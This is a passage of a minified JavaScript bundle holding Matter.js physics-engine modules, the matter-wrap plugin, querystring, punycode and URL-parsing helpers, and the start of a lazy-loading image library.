n=i(3),s=i(7),o=i(13),a=i(4),h=i(14),u=i(10),l=i(5),c=i(0),d=i(1);r.create=function(t,e){var i=(t?t.mouse:null)||(e?e.mouse:null);i||(t&&t.render&&t.render.canvas?i=o.create(t.render.canvas):e&&e.element?i=o.create(e.element):(i=o.create(),c.warn("MouseConstraint.create: options.mouse was undefined, options.element was undefined, may not function as expected")));var n={type:"mouseConstraint",mouse:i,element:null,body:null,constraint:u.create({label:"Mouse Constraint",pointA:i.position,pointB:{x:0,y:0},length:.01,stiffness:.1,angularStiffness:1,render:{strokeStyle:"#90EE90",lineWidth:3}}),collisionFilter:{category:1,mask:4294967295,group:0}},s=c.extend(n,e);return a.on(t,"beforeUpdate",(function(){var e=l.allBodies(t.world);r.update(s,e),r._triggerEvents(s)})),s},r.update=function(t,e){var i=t.mouse,r=t.constraint,o=t.body;if(0===i.button){if(r.bodyB)s.set(r.bodyB,!1),r.pointA=i.position;else for(var u=0;u<e.length;u++)if(o=e[u],d.contains(o.bounds,i.position)&&h.canCollide(o.collisionFilter,t.collisionFilter))for(var l=o.parts.length>1?1:0;l<o.parts.length;l++){var c=o.parts[l];if(n.contains(c.vertices,i.position)){r.pointA=i.position,r.bodyB=t.body=o,r.pointB={x:i.position.x-o.position.x,y:i.position.y-o.position.y},r.angleB=o.angle,s.set(o,!1),a.trigger(t,"startdrag",{mouse:i,body:o});break}}}else r.bodyB=t.body=null,r.pointB=null,o&&a.trigger(t,"enddrag",{mouse:i,body:o})},r._triggerEvents=function(t){var e=t.mouse,i=e.sourceEvents;i.mousemove&&a.trigger(t,"mousemove",{mouse:e}),i.mousedown&&a.trigger(t,"mousedown",{mouse:e}),i.mouseup&&a.trigger(t,"mouseup",{mouse:e}),o.clearSourceEvents(e)}},function(t,e,i){var r={};t.exports=r;var n=i(2),s=i(8),o=i(1),a=i(12),h=i(3);r.collides=function(t,e){for(var i=[],r=e.length,n=t.bounds,a=s.collides,h=o.overlaps,u=0;u<r;u++){var l=e[u],c=l.parts.length,d=1===c?0:1;if(h(l.bounds,n))for(var p=d;p<c;p++){var f=l.parts[p];if(h(f.bounds,n)){var g=a(f,t);if(g){i.push(g);break}}}}return i},r.ray=function(t,e,i,s){s=s||1e-100;for(var o=n.angle(e,i),h=n.magnitude(n.sub(e,i)),u=.5*(i.x+e.x),l=.5*(i.y+e.y),c=a.rectangle(u,l,h,s,{angle:o}),d=r.collides(c,t),p=0;p<d.length;p+=1){var f=d[p];f.body=f.bodyB=f.bodyA}return d},r.region=function(t,e,i){for(var r=[],n=0;n<t.length;n++){var s=t[n],a=o.overlaps(s.bounds,e);(a&&!i||!a&&i)&&r.push(s)}return r},r.point=function(t,e){for(var i=[],r=0;r<t.length;r++){var n=t[r];if(o.contains(n.bounds,e))for(var s=1===n.parts.length?0:1;s<n.parts.length;s++){var a=n.parts[s];if(o.contains(a.bounds,e)&&h.contains(a.vertices,e)){i.push(n);break}}}return i}},function(t,e,i){var r={};t.exports=r;var n,s,o,a=i(4),h=i(18),u=i(0);"undefined"!=typeof window&&(n=window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.msRequestAnimationFrame,s=window.cancelAnimationFrame||window.mozCancelAnimationFrame||window.webkitCancelAnimationFrame||window.msCancelAnimationFrame),n||(n=function(t){o=setTimeout((function(){t(u.now())}),1e3/60)},s=function(){clearTimeout(o)}),r.create=function(t){var e=u.extend({fps:60,correction:1,deltaSampleSize:60,counterTimestamp:0,frameCounter:0,deltaHistory:[],timePrev:null,timeScalePrev:1,frameRequestId:null,isFixed:!1,enabled:!0},t);return e.delta=e.delta||1e3/e.fps,e.deltaMin=e.deltaMin||1e3/e.fps,e.deltaMax=e.deltaMax||1e3/(.5*e.fps),e.fps=1e3/e.delta,e},r.run=function(t,e){return void 0!==t.positionIterations&&(e=t,t=r.create()),function i(s){t.frameRequestId=n(i),s&&t.enabled&&r.tick(t,e,s)}(),t},r.tick=function(t,e,i){var r,n=e.timing,s=1,o={timestamp:n.timestamp};a.trigger(t,"beforeTick",o),t.isFixed?r=t.delta:(r=i-t.timePrev||t.delta,t.timePrev=i,t.deltaHistory.push(r),t.deltaHistory=t.deltaHistory.slice(-t.deltaSampleSize),s=(r=(r=(r=Math.min.apply(null,t.deltaHistory))<t.deltaMin?t.deltaMin:r)>t.deltaMax?t.deltaMax:r)/t.delta,t.delta=r),0!==t.timeScalePrev&&(s*=n.timeScale/t.timeScalePrev),0===n.timeScale&&(s=0),t.timeScalePrev=n.timeScale,t.correction=s,t.frameCounter+=1,i-t.counterTimestamp>=1e3&&(t.fps=t.frameCounter*((i-t.counterTimestamp)/1e3),t.counterTimestamp=i,t.frameCounter=0),a.trigger(t,"tick",o),a.trigger(t,"beforeUpdate",o),h.update(e,r,s),a.trigger(t,"afterUpdate",o),a.trigger(t,"afterTick",o)},r.stop=function(t){s(t.frameRequestId)},r.start=function(t,e){r.run(t,e)}},function(t,e,i){var r={};t.exports=r;var n=i(8),s=i(0).deprecated;r.collides=function(t,e){return n.collides(t,e)},s(r,"collides","SAT.collides ➤ replaced by Collision.collides")},function(t,e,i){var r={};t.exports=r,i(1);var n=i(0);r.pathToVertices=function(t,e){"undefined"==typeof window||"SVGPathSeg"in window||n.warn("Svg.pathToVertices: SVGPathSeg not defined, a polyfill is required.");var i,s,o,a,h,u,l,c,d,p,f,g=[],m=0,v=0,_=0;e=e||15;var y=function(t,e,i){var r=i%2==1&&i>1;if(!d||t!=d.x||e!=d.y){d&&r?(p=d.x,f=d.y):(p=0,f=0);var n={x:p+t,y:f+e};!r&&d||(d=n),g.push(n),v=p+t,_=f+e}},x=function(t){var e=t.pathSegTypeAsLetter.toUpperCase();if("Z"!==e){switch(e){case"M":case"L":case"T":case"C":case"S":case"Q":v=t.x,_=t.y;break;case"H":v=t.x;break;case"V":_=t.y}y(v,_,t.pathSegType)}};for(r._svgPathToAbsolute(t),o=t.getTotalLength(),u=[],i=0;i<t.pathSegList.numberOfItems;i+=1)u.push(t.pathSegList.getItem(i));for(l=u.concat();m<o;){if((h=u[t.getPathSegAtLength(m)])!=c){for(;l.length&&l[0]!=h;)x(l.shift());c=h}switch(h.pathSegTypeAsLetter.toUpperCase()){case"C":case"T":case"S":case"Q":case"A":a=t.getPointAtLength(m),y(a.x,a.y,0)}m+=e}for(i=0,s=l.length;i<s;++i)x(l[i]);return g},r._svgPathToAbsolute=function(t){for(var e,i,r,n,s,o,a=t.pathSegList,h=0,u=0,l=a.numberOfItems,c=0;c<l;++c){var d=a.getItem(c),p=d.pathSegTypeAsLetter;if(/[MLHVCSQTA]/.test(p))"x"in d&&(h=d.x),"y"in d&&(u=d.y);else switch("x1"in d&&(r=h+d.x1),"x2"in d&&(s=h+d.x2),"y1"in d&&(n=u+d.y1),"y2"in d&&(o=u+d.y2),"x"in d&&(h+=d.x),"y"in d&&(u+=d.y),p){case"m":a.replaceItem(t.createSVGPathSegMovetoAbs(h,u),c);break;case"l":a.replaceItem(t.createSVGPathSegLinetoAbs(h,u),c);break;case"h":a.replaceItem(t.createSVGPathSegLinetoHorizontalAbs(h),c);break;case"v":a.replaceItem(t.createSVGPathSegLinetoVerticalAbs(u),c);break;case"c":a.replaceItem(t.createSVGPathSegCurvetoCubicAbs(h,u,r,n,s,o),c);break;case"s":a.replaceItem(t.createSVGPathSegCurvetoCubicSmoothAbs(h,u,s,o),c);break;case"q":a.replaceItem(t.createSVGPathSegCurvetoQuadraticAbs(h,u,r,n),c);break;case"t":a.replaceItem(t.createSVGPathSegCurvetoQuadraticSmoothAbs(h,u),c);break;case"a":a.replaceItem(t.createSVGPathSegArcAbs(h,u,d.r1,d.r2,d.angle,d.largeArcFlag,d.sweepFlag),c);break;case"z":case"Z":h=e,u=i}"M"!=p&&"m"!=p||(e=h,i=u)}}},function(t,e,i){var r={};t.exports=r;var n=i(5);i(0),r.create=n.create,r.add=n.add,r.remove=n.remove,r.clear=n.clear,r.addComposite=n.addComposite,r.addBody=n.addBody,r.addConstraint=n.addConstraint}])},t.exports=r()},334:function(t,e,i){var r;r=function(t){return function(t){var e={};function i(r){if(e[r])return e[r].exports;var n=e[r]={i:r,l:!1,exports:{}};return t[r].call(n.exports,n,n.exports,i),n.l=!0,n.exports}return i.m=t,i.c=e,i.i=function(t){return t},i.d=function(t,e,r){i.o(t,e)||Object.defineProperty(t,e,{configurable:!1,enumerable:!0,get:r})},i.n=function(t){var e=t&&t.__esModule?function(){return t.default}:function(){return t};return i.d(e,"a",e),e},i.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},i.p="/libs",i(i.s=1)}([function(e,i){e.exports=t},function(t,e,i){"use strict";var r=i(0),n={name:"matter-wrap",version:"0.1.3",for:"matter-js@^0.12.0",install:function(t){t.after("Engine.update",(function(){n.Engine.update(this)}))},Engine:{update:function(t){for(var e=t.world,i=r.Composite.allBodies(e),s=r.Composite.allComposites(e),o=0;o<i.length;o+=1){var a=i[o];a.plugin.wrap&&n.Body.wrap(a,a.plugin.wrap)}for(o=0;o<s.length;o+=1){var h=s[o];h.plugin.wrap&&n.Composite.wrap(h,h.plugin.wrap)}}},Bounds:{wrap:function(t,e){var i=null,r=null;if(void 0!==e.min.x&&void 0!==e.max.x&&(t.min.x>e.max.x?i=e.min.x-t.max.x:t.max.x<e.min.x&&(i=e.max.x-t.min.x)),void 0!==e.min.y&&void 0!==e.max.y&&(t.min.y>e.max.y?r=e.min.y-t.max.y:t.max.y<e.min.y&&(r=e.max.y-t.min.y)),null!==i||null!==r)return{x:i||0,y:r||0}}},Body:{wrap:function(t,e){var i=n.Bounds.wrap(t.bounds,e);return i&&r.Body.translate(t,i),i}},Composite:{bounds:function(t){for(var e=r.Composite.allBodies(t),i=[],n=0;n<e.length;n+=1){var s=e[n];i.push(s.bounds.min,s.bounds.max)}return r.Bounds.create(i)},wrap:function(t,e){var i=n.Bounds.wrap(n.Composite.bounds(t),e);return i&&r.Composite.translate(t,i),i}}};r.Plugin.register(n),t.exports=n}])},t.exports=r(i(842))},587:t=>{"use strict";function e(t,e){return Object.prototype.hasOwnProperty.call(t,e)}t.exports=function(t,i,r,n){i=i||"&",r=r||"=";var s={};if("string"!=typeof t||0===t.length)return s;var o=/\+/g;t=t.split(i);var a=1e3;n&&"number"==typeof n.maxKeys&&(a=n.maxKeys);var h=t.length;a>0&&h>a&&(h=a);for(var u=0;u<h;++u){var l,c,d,p,f=t[u].replace(o,"%20"),g=f.indexOf(r);g>=0?(l=f.substr(0,g),c=f.substr(g+1)):(l=f,c=""),d=decodeURIComponent(l),p=decodeURIComponent(c),e(s,d)?Array.isArray(s[d])?s[d].push(p):s[d]=[s[d],p]:s[d]=p}return s}},361:t=>{"use strict";var e=function(t){switch(typeof t){case"string":return t;case"boolean":return t?"true":"false";case"number":return isFinite(t)?t:"";default:return""}};t.exports=function(t,i,r,n){return i=i||"&",r=r||"=",null===t&&(t=void 0),"object"==typeof t?Object.keys(t).map((function(n){var s=encodeURIComponent(e(n))+r;return Array.isArray(t[n])?t[n].map((function(t){return s+encodeURIComponent(e(t))})).join(i):s+encodeURIComponent(e(t[n]))})).join(i):n?encodeURIComponent(e(n))+r+encodeURIComponent(e(t)):""}},673:(t,e,i)=>{"use strict";e.decode=e.parse=i(587),e.encode=e.stringify=i(361)},511:function(t,e,i){var r;t=i.nmd(t),function(n){e&&e.nodeType,t&&t.nodeType;var s="object"==typeof i.g&&i.g;s.global!==s&&s.window!==s&&s.self;var o,a=2147483647,h=36,u=/^xn--/,l=/[^\x20-\x7E]/,c=/[\x2E\u3002\uFF0E\uFF61]/g,d={overflow:"Overflow: input needs wider integers to process","not-basic":"Illegal input >= 0x80 (not a basic code point)","invalid-input":"Invalid input"},p=Math.floor,f=String.fromCharCode;function g(t){throw RangeError(d[t])}function m(t,e){for(var i=t.length,r=[];i--;)r[i]=e(t[i]);return r}function v(t,e){var i=t.split("@"),r="";return i.length>1&&(r=i[0]+"@",t=i[1]),r+m((t=t.replace(c,".")).split("."),e).join(".")}function _(t){for(var e,i,r=[],n=0,s=t.length;n<s;)(e=t.charCodeAt(n++))>=55296&&e<=56319&&n<s?56320==(64512&(i=t.charCodeAt(n++)))?r.push(((1023&e)<<10)+(1023&i)+65536):(r.push(e),n--):r.push(e);return r}function y(t){return m(t,(function(t){var e="";return t>65535&&(e+=f((t-=65536)>>>10&1023|55296),t=56320|1023&t),e+f(t)})).join("")}function x(t,e){return t+22+75*(t<26)-((0!=e)<<5)}function E(t,e,i){var r=0;for(t=i?p(t/700):t>>1,t+=p(t/e);t>455;r+=h)t=p(t/35);return p(r+36*t/(t+38))}function b(t){var e,i,r,n,s,o,u,l,c,d,f,m=[],v=t.length,_=0,x=128,b=72;for((i=t.lastIndexOf("-"))<0&&(i=0),r=0;r<i;++r)t.charCodeAt(r)>=128&&g("not-basic"),m.push(t.charCodeAt(r));for(n=i>0?i+1:0;n<v;){for(s=_,o=1,u=h;n>=v&&g("invalid-input"),((l=(f=t.charCodeAt(n++))-48<10?f-22:f-65<26?f-65:f-97<26?f-97:h)>=h||l>p((a-_)/o))&&g("overflow"),_+=l*o,!(l<(c=u<=b?1:u>=b+26?26:u-b));u+=h)o>p(a/(d=h-c))&&g("overflow"),o*=d;b=E(_-s,e=m.length+1,0==s),p(_/e)>a-x&&g("overflow"),x+=p(_/e),_%=e,m.splice(_++,0,x)}return y(m)}function T(t){var e,i,r,n,s,o,u,l,c,d,m,v,y,b,T,D=[];for(v=(t=_(t)).length,e=128,i=0,s=72,o=0;o<v;++o)(m=t[o])<128&&D.push(f(m));for(r=n=D.length,n&&D.push("-");r<v;){for(u=a,o=0;o<v;++o)(m=t[o])>=e&&m<u&&(u=m);for(u-e>p((a-i)/(y=r+1))&&g("overflow"),i+=(u-e)*y,e=u,o=0;o<v;++o)if((m=t[o])<e&&++i>a&&g("overflow"),m==e){for(l=i,c=h;!(l<(d=c<=s?1:c>=s+26?26:c-s));c+=h)T=l-d,b=h-d,D.push(f(x(d+T%b,0))),l=p(T/b);D.push(f(x(l,0))),s=E(i,y,r==n),i=0,++r}++i,++e}return D.join("")}o={version:"1.3.2",ucs2:{decode:_,encode:y},decode:b,encode:T,toASCII:function(t){return v(t,(function(t){return l.test(t)?"xn--"+T(t):t}))},toUnicode:function(t){return v(t,(function(t){return u.test(t)?b(t.slice(4).toLowerCase()):t}))}},void 0===(r=function(){return o}.call(e,i,e,t))||(t.exports=r)}()},575:(t,e,i)=>{"use strict";var r=i(511),n=i(502);function s(){this.protocol=null,this.slashes=null,this.auth=null,this.host=null,this.port=null,this.hostname=null,this.hash=null,this.search=null,this.query=null,this.pathname=null,this.path=null,this.href=null}e.parse=y,e.resolve=function(t,e){return y(t,!1,!0).resolve(e)},e.resolveObject=function(t,e){return t?y(t,!1,!0).resolveObject(e):e},e.format=function(t){return n.isString(t)&&(t=y(t)),t instanceof s?t.format():s.prototype.format.call(t)},e.Url=s;var o=/^([a-z0-9.+-]+:)/i,a=/:[0-9]*$/,h=/^(\/\/?(?!\/)[^\?\s]*)(\?[^\s]*)?$/,u=["{","}","|","\\","^","`"].concat(["<",">",'"',"`"," ","\r","\n","\t"]),l=["'"].concat(u),c=["%","/","?",";","#"].concat(l),d=["/","?","#"],p=/^[+a-z0-9A-Z_-]{0,63}$/,f=/^([+a-z0-9A-Z_-]{0,63})(.*)$/,g={javascript:!0,"javascript:":!0},m={javascript:!0,"javascript:":!0},v={http:!0,https:!0,ftp:!0,gopher:!0,file:!0,"http:":!0,"https:":!0,"ftp:":!0,"gopher:":!0,"file:":!0},_=i(673);function y(t,e,i){if(t&&n.isObject(t)&&t instanceof s)return t;var r=new s;return r.parse(t,e,i),r}s.prototype.parse=function(t,e,i){if(!n.isString(t))throw new TypeError("Parameter 'url' must be a string, not "+typeof t);var s=t.indexOf("?"),a=-1!==s&&s<t.indexOf("#")?"?":"#",u=t.split(a);u[0]=u[0].replace(/\\/g,"/");var y=t=u.join(a);if(y=y.trim(),!i&&1===t.split("#").length){var x=h.exec(y);if(x)return this.path=y,this.href=y,this.pathname=x[1],x[2]?(this.search=x[2],this.query=e?_.parse(this.search.substr(1)):this.search.substr(1)):e&&(this.search="",this.query={}),this}var E=o.exec(y);if(E){var b=(E=E[0]).toLowerCase();this.protocol=b,y=y.substr(E.length)}if(i||E||y.match(/^\/\/[^@\/]+@[^@\/]+/)){var T="//"===y.substr(0,2);!T||E&&m[E]||(y=y.substr(2),this.slashes=!0)}if(!m[E]&&(T||E&&!v[E])){for(var D,w,S=-1,A=0;A<d.length;A++)-1!==(C=y.indexOf(d[A]))&&(-1===S||C<S)&&(S=C);for(-1!==(w=-1===S?y.lastIndexOf("@"):y.lastIndexOf("@",S))&&(D=y.slice(0,w),y=y.slice(w+1),this.auth=decodeURIComponent(D)),S=-1,A=0;A<c.length;A++){var C;-1!==(C=y.indexOf(c[A]))&&(-1===S||C<S)&&(S=C)}-1===S&&(S=y.length),this.host=y.slice(0,S),y=y.slice(S),this.parseHost(),this.hostname=this.hostname||"";var I="["===this.hostname[0]&&"]"===this.hostname[this.hostname.length-1];if(!I)for(var R=this.hostname.split(/\./),P=(A=0,R.length);A<P;A++){var O=R[A];if(O&&!O.match(p)){for(var N="",M=0,F=O.length;M<F;M++)O.charCodeAt(M)>127?N+="x":N+=O[M];if(!N.match(p)){var L=R.slice(0,A),B=R.slice(A+1),U=O.match(f);U&&(L.push(U[1]),B.unshift(U[2])),B.length&&(y="/"+B.join(".")+y),this.hostname=L.join(".");break}}}this.hostname.length>255?this.hostname="":this.hostname=this.hostname.toLowerCase(),I||(this.hostname=r.toASCII(this.hostname));var k=this.port?":"+this.port:"",G=this.hostname||"";this.host=G+k,this.href+=this.host,I&&(this.hostname=this.hostname.substr(1,this.hostname.length-2),"/"!==y[0]&&(y="/"+y))}if(!g[b])for(A=0,P=l.length;A<P;A++){var H=l[A];if(-1!==y.indexOf(H)){var z=encodeURIComponent(H);z===H&&(z=escape(H)),y=y.split(H).join(z)}}var V=y.indexOf("#");-1!==V&&(this.hash=y.substr(V),y=y.slice(0,V));var X=y.indexOf("?");if(-1!==X?(this.search=y.substr(X),this.query=y.substr(X+1),e&&(this.query=_.parse(this.query)),y=y.slice(0,X)):e&&(this.search="",this.query={}),y&&(this.pathname=y),v[b]&&this.hostname&&!this.pathname&&(this.pathname="/"),this.pathname||this.search){k=this.pathname||"";var j=this.search||"";this.path=k+j}return this.href=this.format(),this},s.prototype.format=function(){var t=this.auth||"";t&&(t=(t=encodeURIComponent(t)).replace(/%3A/i,":"),t+="@");var e=this.protocol||"",i=this.pathname||"",r=this.hash||"",s=!1,o="";this.host?s=t+this.host:this.hostname&&(s=t+(-1===this.hostname.indexOf(":")?this.hostname:"["+this.hostname+"]"),this.port&&(s+=":"+this.port)),this.query&&n.isObject(this.query)&&Object.keys(this.query).length&&(o=_.stringify(this.query));var a=this.search||o&&"?"+o||"";return e&&":"!==e.substr(-1)&&(e+=":"),this.slashes||(!e||v[e])&&!1!==s?(s="//"+(s||""),i&&"/"!==i.charAt(0)&&(i="/"+i)):s||(s=""),r&&"#"!==r.charAt(0)&&(r="#"+r),a&&"?"!==a.charAt(0)&&(a="?"+a),e+s+(i=i.replace(/[?#]/g,(function(t){return encodeURIComponent(t)})))+(a=a.replace("#","%23"))+r},s.prototype.resolve=function(t){return this.resolveObject(y(t,!1,!0)).format()},s.prototype.resolveObject=function(t){if(n.isString(t)){var e=new s;e.parse(t,!1,!0),t=e}for(var i=new s,r=Object.keys(this),o=0;o<r.length;o++){var a=r[o];i[a]=this[a]}if(i.hash=t.hash,""===t.href)return i.href=i.format(),i;if(t.slashes&&!t.protocol){for(var h=Object.keys(t),u=0;u<h.length;u++){var l=h[u];"protocol"!==l&&(i[l]=t[l])}return v[i.protocol]&&i.hostname&&!i.pathname&&(i.path=i.pathname="/"),i.href=i.format(),i}if(t.protocol&&t.protocol!==i.protocol){if(!v[t.protocol]){for(var c=Object.keys(t),d=0;d<c.length;d++){var p=c[d];i[p]=t[p]}return i.href=i.format(),i}if(i.protocol=t.protocol,t.host||m[t.protocol])i.pathname=t.pathname;else{for(var f=(t.pathname||"").split("/");f.length&&!(t.host=f.shift()););t.host||(t.host=""),t.hostname||(t.hostname=""),""!==f[0]&&f.unshift(""),f.length<2&&f.unshift(""),i.pathname=f.join("/")}if(i.search=t.search,i.query=t.query,i.host=t.host||"",i.auth=t.auth,i.hostname=t.hostname||t.host,i.port=t.port,i.pathname||i.search){var g=i.pathname||"",_=i.search||"";i.path=g+_}return i.slashes=i.slashes||t.slashes,i.href=i.format(),i}var y=i.pathname&&"/"===i.pathname.charAt(0),x=t.host||t.pathname&&"/"===t.pathname.charAt(0),E=x||y||i.host&&t.pathname,b=E,T=i.pathname&&i.pathname.split("/")||[],D=(f=t.pathname&&t.pathname.split("/")||[],i.protocol&&!v[i.protocol]);if(D&&(i.hostname="",i.port=null,i.host&&(""===T[0]?T[0]=i.host:T.unshift(i.host)),i.host="",t.protocol&&(t.hostname=null,t.port=null,t.host&&(""===f[0]?f[0]=t.host:f.unshift(t.host)),t.host=null),E=E&&(""===f[0]||""===T[0])),x)i.host=t.host||""===t.host?t.host:i.host,i.hostname=t.hostname||""===t.hostname?t.hostname:i.hostname,i.search=t.search,i.query=t.query,T=f;else if(f.length)T||(T=[]),T.pop(),T=T.concat(f),i.search=t.search,i.query=t.query;else if(!n.isNullOrUndefined(t.search))return D&&(i.hostname=i.host=T.shift(),(I=!!(i.host&&i.host.indexOf("@")>0)&&i.host.split("@"))&&(i.auth=I.shift(),i.host=i.hostname=I.shift())),i.search=t.search,i.query=t.query,n.isNull(i.pathname)&&n.isNull(i.search)||(i.path=(i.pathname?i.pathname:"")+(i.search?i.search:"")),i.href=i.format(),i;if(!T.length)return i.pathname=null,i.search?i.path="/"+i.search:i.path=null,i.href=i.format(),i;for(var w=T.slice(-1)[0],S=(i.host||t.host||T.length>1)&&("."===w||".."===w)||""===w,A=0,C=T.length;C>=0;C--)"."===(w=T[C])?T.splice(C,1):".."===w?(T.splice(C,1),A++):A&&(T.splice(C,1),A--);if(!E&&!b)for(;A--;A)T.unshift("..");!E||""===T[0]||T[0]&&"/"===T[0].charAt(0)||T.unshift(""),S&&"/"!==T.join("/").substr(-1)&&T.push("");var I,R=""===T[0]||T[0]&&"/"===T[0].charAt(0);return D&&(i.hostname=i.host=R?"":T.length?T.shift():"",(I=!!(i.host&&i.host.indexOf("@")>0)&&i.host.split("@"))&&(i.auth=I.shift(),i.host=i.hostname=I.shift())),(E=E||i.host&&T.length)&&!R&&T.unshift(""),T.length?i.pathname=T.join("/"):(i.pathname=null,i.path=null),n.isNull(i.pathname)&&n.isNull(i.search)||(i.path=(i.pathname?i.pathname:"")+(i.search?i.search:"")),i.auth=t.auth||i.auth,i.slashes=i.slashes||t.slashes,i.href=i.format(),i},s.prototype.parseHost=function(){var t=this.host,e=a.exec(t);e&&(":"!==(e=e[0])&&(this.port=e.substr(1)),t=t.substr(0,t.length-e.length)),t&&(this.hostname=t)}},502:t=>{"use strict";t.exports={isString:function(t){return"string"==typeof t},isObject:function(t){return"object"==typeof t&&null!==t},isNull:function(t){return null===t},isNullOrUndefined:function(t){return null==t}}},732:function(t){t.exports=function(){"use strict";function t(){return(t=Object.assign||function(t){for(var e=1;e<arguments.length;e++){var i=arguments[e];for(var r in i)Object.prototype.hasOwnProperty.call(i,r)&&(t[r]=i[r])}return t}).apply(this,arguments)}var e="undefined"!=typeof window,i=e&&!("onscroll"in window)||"undefined"!=typeof navigator&&/(gle|ing|ro)bot|crawl|spider/i.test(navigator.userAgent),r=e&&"IntersectionObserver"in window,n=e&&"classList"in document.createElement("p"),s=e&&window.devicePixelRatio>1,o={elements_selector:".lazy",container:i||e?document:null,threshold:300,thresholds:null,data_src:"src",data_srcset:"srcset",data_sizes:"sizes",data_bg:"bg",data_bg_hidpi:"bg-hidpi",data_bg_multi:"bg-multi",data_bg_multi_hidpi:"bg-multi-hidpi",data_poster:"poster",class_applied:"applied",class_loading:"loading",class_loaded:"loaded",class_error:"error",class_entered:"entered",class_exited:"exited",unobserve_completed:!0,unobserve_entered:!1,cancel_on_exit:!0,callback_enter:null,callback_exit:null,callback_applied:null,callback_loading:null,callback_loaded:null,callback_error:null,callback_finish:null,callback_cancel:null,use_native:!1,restore_on_error:!1},a=function(e){return t({},o,e)},h=function(t,e){var i,r="LazyLoad::Initialized",n=new t(e);try{i=new CustomEvent(r,{detail:{instance:n}})}catch(t){(i=document.createEvent("CustomEvent")).initCustomEvent(r,!1,!1,{instance:n})}window.dispatchEvent(i)},u="src",l="srcset",c="sizes",d="poster",p="llOriginalAttrs",f="data",g="loading",m="loaded",v="applied",_="error",y="native",x=function(t,e){return t.getAttribute("data-"+e)},E=function(t){return x(t,"ll-status")},b=function(t,e){return function(t,e,i){var r="data-ll-status";null!==i?t.setAttribute(r,i):t.removeAttribute(r)}(t,0,e)},T=function(t){return b(t,null)},D=function(t){return null===E(t)},w=function(t){return E(t)===y},S=[g,m,v,_],A=function(t,e,i,r){t&&(void 0===r?void 0===i?t(e):t(e,i):t(e,i,r))},C=function(t,e){n?t.classList.add(e):t.className+=(t.className?" ":"")+e},I=function(t,e){n?t.classList.remove(e):t.className=t.className.replace(new RegExp("(^|\\s+)"+e+"(\\s+|$)")," ").replace(/^\s+/,"").replace(/\s+$/,"")},R=function(t){return t.llTempImage},P=function(t,e){if(e){var i=e._observer;i&&i.unobserve(t)}},O=function(t,e){t&&(t.loadingCount+=e)},N=function(t,e){t&&(t.toLoadCount=e)},M=function(t){for(var e,i=[],r=0;e=t.children[r];r+=1)"SOURCE"===e.tagName&&i.push(e);return i},F=function(t,e){var i=t.parentNode;i&&"PICTURE"===i.tagName&&M(i).forEach(e)},L=function(t,e){M(t).forEach(e)},B=[u],U=[u,d],k=[u,l,c],G=[f],H=function(t){return!!t[p]},z=function(t){return t[p]},V=function(t){return delete t[p]},X=function(t,e){if(!H(t)){var i={};e.forEach((function(e){i[e]=t.getAttribute(e)})),t[p]=i}},j=function(t,e){if(H(t)){var i=z(t);e.forEach((function(e){!function(t,e,i){i?t.setAttribute(e,i):t.removeAttribute(e)}(t,e,i[e])}))}},$=function(t,e,i){C(t,e.class_loading),b(t,g),i&&(O(i,1),A(e.callback_loading,t,i))},W=function(t,e,i){i&&t.setAttribute(e,i)},Y=function(t,e){W(t,c,x(t,e.data_sizes)),W(t,l,x(t,e.data_srcset)),W(t,u,x(t,e.data_src))},q={IMG:function(t,e){F(t,(function(t){X(t,k),Y(t,e)})),X(t,k),Y(t,e)},IFRAME:function(t,e){X(t,B),W(t,u,x(t,e.data_src))},VIDEO:function(t,e){L(t,(function(t){X(t,B),W(t,u,x(t,e.data_src))})),X(t,U),W(t,d,x(t,e.data_poster)),W(t,u,x(t,e.data_src)),t.load()},OBJECT:function(t,e){X(t,G),W(t,f,x(t,e.data_src))}},Z=["IMG","IFRAME","VIDEO","OBJECT"],K=function(t,e){!e||function(t){return t.loadingCount>0}(e)||function(t){return t.toLoadCount>0}(e)||A(t.callback_finish,e)},Q=function(t,e,i){t.addEventListener(e,i),t.llEvLisnrs[e]=i},J=function(t,e,i){t.removeEventListener(e,i)},tt=function(t){return!!t.llEvLisnrs},et=function(t){if(tt(t)){var e=t.llEvLisnrs;for(var i in e){var r=e[i];J(t,i,r)}delete t.llEvLisnrs}},it=function(t,e,i){!function(t){delete t.llTempImage}(t),O(i,-1),function(t){t&&(t.toLoadCount-=1)}(i),I(t,e.class_loading),e.unobserve_completed&&P(t,i)},rt=function(t,e,i){var r=R(t)||t;tt(r)||function(t,e,i){tt(t)||(t.llEvLisnrs={});var r="VIDEO"===t.tagName?"loadeddata":"load";Q(t,r,e),Q(t,"error",i)}(r,(function(n){!function(t,e,i,r){var n=w(e);it(e,i,r),C(e,i.class_loaded),b(e,m),A(i.callback_loaded,e,r),n||K(i,r)}(0,t,e,i),et(r)}),(function(n){!function(t,e,i,r){var n=w(e);it(e,i,r),C(e,i.class_error),b(e,_),A(i.callback_error,e,r),i.restore_on_error&&j(e,k),n||K(i,r)}(0,t,e,i),et(r)}))},nt=function(t,e,i){!function(t){return Z.indexOf(t.tagName)>-1}(t)?function(t,e,i){!function(t){t.llTempImage=document.createElement("IMG")}(t),rt(t,e,i),function(t){H(t)||(t[p]={backgroundImage:t.style.backgroundImage})}(t),function(t,e,i){var r=x(t,e.data_bg),n=x(t,e.data_bg_hidpi),o=s&&n?n:r;o&&(t.style.backgroundImage='url("'.concat(o,'")'),R(t).setAttribute(u,o),$(t,e,i))}(t,e,i),function(t,e,i){var r=x(t,e.data_bg_multi),n=x(t,e.data_bg_multi_hidpi),o=s&&n?n:r;o&&(t.style.backgroundImage=o,function(t,e,i){C(t,e.class_applied),b(t,v),i&&(e.unobserve_completed&&P(t,e),A(e.callback_applied,t,i))}(t,e,i))}(t,e,i)}(t,e,i):function(t,e,i){rt(t,e,i),function(t,e,i){var r=q[t.tagName];r&&(r(t,e),$(t,e,i))}(t,e,i)}(t,e,i)},st=function(t){t.removeAttribute(u),t.removeAttribute(l),t.removeAttribute(c)},ot=function(t){F(t,(function(t){j(t,k)})),j(t,k)},at={IMG:ot,IFRAME:function(t){j(t,B)},VIDEO:function(t){L(t,(function(t){j(t,B)})),j(t,U),t.load()},OBJECT:function(t){j(t,G)}},ht=["IMG","IFRAME","VIDEO"],ut=function(t){return t.use_native&&"loading"in HTMLImageElement.prototype},lt=function(t){return Array.prototype.slice.call(t)},ct=function(t){return t.container.querySelectorAll(t.elements_selector)},dt=function(t){return function(t){return E(t)===_}(t)},pt=function(t,e){return function(t){return lt(t).filter(D)}(t||ct(e))},ft=function(t,i){var 